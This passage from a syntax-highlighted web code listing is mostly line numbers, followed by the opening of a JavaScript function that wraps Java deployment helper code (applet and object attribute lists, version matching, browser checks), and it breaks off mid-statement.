class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">java</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> deployJava = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> l = &#123;</span><br><span class=\"line\">            core: [<span class=\"string\">\"id\"</span>, <span class=\"string\">\"class\"</span>, <span class=\"string\">\"title\"</span>, <span class=\"string\">\"style\"</span>],</span><br><span class=\"line\">            i18n: [<span class=\"string\">\"lang\"</span>, <span class=\"string\">\"dir\"</span>],</span><br><span class=\"line\">            events: [<span class=\"string\">\"onclick\"</span>, <span class=\"string\">\"ondblclick\"</span>, <span class=\"string\">\"onmousedown\"</span>, <span class=\"string\">\"onmouseup\"</span>, <span class=\"string\">\"onmouseover\"</span>, <span class=\"string\">\"onmousemove\"</span>, <span class=\"string\">\"onmouseout\"</span>, <span class=\"string\">\"onkeypress\"</span>, <span class=\"string\">\"onkeydown\"</span>, <span class=\"string\">\"onkeyup\"</span>],</span><br><span class=\"line\">            applet: [<span class=\"string\">\"codebase\"</span>, <span class=\"string\">\"code\"</span>, <span class=\"string\">\"name\"</span>, <span class=\"string\">\"archive\"</span>, <span class=\"string\">\"object\"</span>, <span class=\"string\">\"width\"</span>, <span class=\"string\">\"height\"</span>, <span class=\"string\">\"alt\"</span>, <span class=\"string\">\"align\"</span>, <span class=\"string\">\"hspace\"</span>, <span class=\"string\">\"vspace\"</span>],</span><br><span class=\"line\">            object: [<span class=\"string\">\"classid\"</span>, <span class=\"string\">\"codebase\"</span>, <span class=\"string\">\"codetype\"</span>, <span class=\"string\">\"data\"</span>, <span class=\"string\">\"type\"</span>, <span class=\"string\">\"archive\"</span>, <span class=\"string\">\"declare\"</span>, <span class=\"string\">\"standby\"</span>, <span class=\"string\">\"height\"</span>, <span class=\"string\">\"width\"</span>, <span class=\"string\">\"usemap\"</span>, <span class=\"string\">\"name\"</span>, <span class=\"string\">\"tabindex\"</span>, <span class=\"string\">\"align\"</span>, <span class=\"string\">\"border\"</span>, <span class=\"string\">\"hspace\"</span>, <span class=\"string\">\"vspace\"</span>]</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> b = l.object.concat(l.core, l.i18n, l.events);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> m = l.applet.concat(l.core);</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">g</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!d.debug) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">console</span>.log) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(n)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                alert(n)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">k</span><span class=\"params\">(o, n)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (o == <span class=\"literal\">null</span> || o.length == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> q = o.charAt(o.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (q != <span class=\"string\">\"+\"</span> &amp;&amp; q != <span class=\"string\">\"*\"</span> &amp;&amp; (o.indexOf(<span class=\"string\">\"_\"</span>) != -<span class=\"number\">1</span> &amp;&amp; q != <span class=\"string\">\"_\"</span>)) &#123;</span><br><span class=\"line\">                o = o + <span class=\"string\">\"*\"</span>;</span><br><span class=\"line\">                q = <span class=\"string\">\"*\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            o = o.substring(<span class=\"number\">0</span>, o.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (o.length &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> p = o.charAt(o.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (p == <span class=\"string\">\".\"</span> || p == <span class=\"string\">\"_\"</span>) &#123;</span><br><span class=\"line\">                    o = o.substring(<span class=\"number\">0</span>, o.length - <span class=\"number\">1</span>)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (q == <span class=\"string\">\"*\"</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (n.indexOf(o) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (q == <span class=\"string\">\"+\"</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> o &lt;= n</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">e</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> n = <span class=\"string\">\"//java.com/js/webstart.png\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"built_in\">document</span>.location.protocol.indexOf(<span class=\"string\">\"http\"</span>) != -<span class=\"number\">1</span> ? n: <span class=\"string\">\"http:\"</span> + n</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(o) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">\"http:\"</span> + n</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">j</span><span class=\"params\">(p, o)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> n = p.length;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> q = <span class=\"number\">0</span>; q &lt; n; q++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (p[q] === o) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">c</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> j(m, n.toLowerCase())</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">i</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> j(b, n.toLowerCase())</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"string\">\"MSIE\"</span> != deployJava.browserName) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> 